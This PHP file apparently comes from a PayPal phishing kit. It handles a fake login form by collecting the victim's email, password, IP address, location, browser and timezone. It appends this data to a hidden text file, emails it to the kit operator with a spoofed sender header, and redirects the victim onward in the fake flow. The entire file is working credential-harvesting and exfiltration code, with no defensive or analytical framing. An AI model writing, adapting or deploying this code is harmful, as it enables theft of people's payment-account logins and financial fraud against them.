<?php if (isset($_POST['EML']) && isset($_POST['PWD'])) {
    session_start();
    include '../mine.php';
    $_SESSION['EML'] = $_POST['EML'];
    $msg = "=========== <[ Ussef PaYPal LoGiN]> ===========
";
    $msg.= "EMAIL		: {$_POST['EML']}
";
    $msg.= "PASS		: {$_POST['PWD']}
";
    $msg.= "---------------------- IP Info ----------------------
";
    $msg.= "IP ADDRESS	: {$_SESSION['ip']}
";
    $msg.= "LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
    $msg.= "BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}
";
    $msg.= "TIMEZONE	: {$_SESSION['ip_timezone']}
";
    $msg.= "TIME		: " . now() . " GMT
";
    $msg.= "=========== <[ Ussef PaYPal LoGiN]> ===========


";
    $save = fopen("../../hahaha883.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "PaYPal LoGiN [" . $_POST['EML'] . "|" . $_SESSION['ip_countryName'] . "]";
    $headers = "From:Ussef <ussef@sudospeak.com>
";
    $headers.= "MIME-Version: 1.0
";
    $headers.= "Content-Type: text/plain; charset=UTF-8
";
    @mail($yours, $subject, $msg, $headers);
    exit(header("Location: ../../app/process"));
} ?>